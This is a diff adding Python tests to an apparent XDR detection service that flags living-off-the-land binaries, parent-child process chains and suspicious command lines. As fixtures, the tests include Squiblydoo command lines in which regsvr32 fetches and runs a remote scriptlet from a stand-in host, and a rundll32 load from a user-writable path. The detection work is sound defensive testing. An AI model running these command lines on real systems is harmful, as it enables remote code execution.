@@ -133,6 +133,105 @@ def test_match_engine_detects_mshta_abuse():
     assert any(h["entry_name"].lower().startswith("mshta") for h in hits)
 
 
+def test_attack_chain_and_cli_heuristics():
+    """Named 3-hop attack chains + command-line heuristics fire deterministically."""
+    _skip_if_no_mongo()
+    r = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
+                          json={"image": "regsvr32.exe",
+                                    "parent_image": "winword.exe",
+                                    "grandparent_image": "outlook.exe",
+                                    "command_line": "regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"})
+    hits = r.json()["data"]["hits"]
+    chains = [h for h in hits if h["kind"] == "lolbin.attack_chain"]
+    assert chains, "attack chain must be surfaced"
+    assert any("outlook" in (h["value"] or "").lower() for h in chains)
+    heur = [h for h in hits if h["kind"] == "lolbin.cli_heuristic"]
+    assert any(h["heuristic"] == "http_argument" for h in heur)
+
+    r2 = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
+                              json={"image": "rundll32.exe",
+                                        "command_line": "rundll32.exe C:\\Users\\Public\\update.dll,Start"})
+    heur2 = [h for h in r2.json()["data"]["hits"]
+                    if h["kind"] == "lolbin.cli_heuristic"]
+    kinds = {h["heuristic"] for h in heur2}
+    assert "userwritable_path" in kinds
+    assert "dll_load_export"   in kinds
+
+
+def test_lolbin_identity_is_capability_not_verdict():
+    """Non-regression gate: matching a LOLBIN by image alone must
+    return `observation_type=LOLBIN` with `signal_strength=OBSERVED`,
+    not any verdict-like classification.  The response's `contract`
+    field must reassert the principle."""
+    _skip_if_no_mongo()
+    # Ensure pack is synced (xdist workers may not have run test_sync).
+    client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}", headers=_hdrs())
+    r = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
+                          json={"image": "regsvr32.exe"})
+    j = r.json()["data"]
+    assert j["contract"]["principle"].startswith("Living-off-the-land")
+    # Response never carries a verdict field.
+    assert "verdict" not in j
+    lolbin_hits = [h for h in j["hits"] if h["kind"] == "lolbin.image"]
+    assert lolbin_hits
+    for h in lolbin_hits:
+        assert h["observation_type"] == "LOLBIN"
+        assert h["signal_strength"]  == "OBSERVED"
+        assert "capability" in (h.get("note") or "").lower()
+    # Aggregate for a naked LOLBIN observation must NOT reach
+    # CORRELATION_CANDIDATE.  The Squiblydoo chain, in contrast, must.
+    assert j["disposition"] in ("OBSERVED", "OBSERVED_WITH_SIGNAL")
+
+    r2 = client.post("/api/xdr/lolbas/match", headers=_hdrs(),
+                              json={"image": "regsvr32.exe",
+                                        "parent_image": "winword.exe",
+                                        "grandparent_image": "outlook.exe",
+                                        "command_line": "regsvr32 /s /u /i:http://x/y.sct scrobj.dll"})
+    j2 = r2.json()["data"]
+    # Even the classic Squiblydoo phishing chain — the STRONGEST case
+    # NivXRay can emit from LOLBAS primitives alone — must NOT reach
+    # any verdict-like state.  It escalates to "contextualized" so the
+    # correlation engine can combine it with IOC / network / persistence
+    # evidence.  The user's principle: LOLBIN evidence is a capability,
+    # not a verdict.
+    assert j2["disposition"] in ("CONTEXTUALIZED", "CORRELATION_CANDIDATE")
+    assert "verdict" not in j2
+    # Chain must be present and clearly labeled STRONG evidence, still
+    # not a verdict.
+    chain = [h for h in j2["hits"] if h["kind"] == "lolbin.attack_chain"]
+    assert chain
+    for h in chain:
+        assert h["signal_strength"] == "STRONG"
+        assert "verdict" in (h.get("note") or "").lower()
+
+
+def test_universal_parent_child_coverage_beyond_15():
+    """Non-regression gate: parent-child primitives must exist for
+    LOLBINs OUTSIDE the curated 15 registry entries.  Every executable
+    LOLBAS entry must participate in tiered parent-child evidence."""
+    _skip_if_no_mongo()
+    client.post(f"/api/xdr/lolbas/sync?url={FIXTURE_URL}", headers=_hdrs())
+    # Pick an entry that is NOT in the curated registry.
+    row = lb._entries().find_one(
+        {"name": {"$regex": "^Atbroker", "$options": "i"}})
+    if not row:
+        # Fall back to any executable-bearing entry not in registry.
+        for cand in ("Cmstp.exe", "Control.exe", "Forfiles.exe",
+                              "Presentationhost.exe", "Cdb.exe"):
+            row = lb._entries().find_one({"name": cand})
+            if row:
+                break
+    assert row is not None, "no non-curated LOLBIN entry to test"
+    name = row["name"]
+    prims = list(lb._primitives().find(
+        {"entry_name": name, "kind": "lolbin.parent_child"}))
+    assert prims, f"{name} has no parent-child primitives — coverage gap"
+    tiers = {p["tier"] for p in prims}
+    assert {"normal", "suspicious", "abnormal"} <= tiers, tiers
+
+
+
+
 def test_parent_child_tier_normal_suspicious_abnormal():
     """Every LOLBIN with parent-child registry emits normal/suspicious/
     abnormal primitives; the match engine surfaces the tier."""
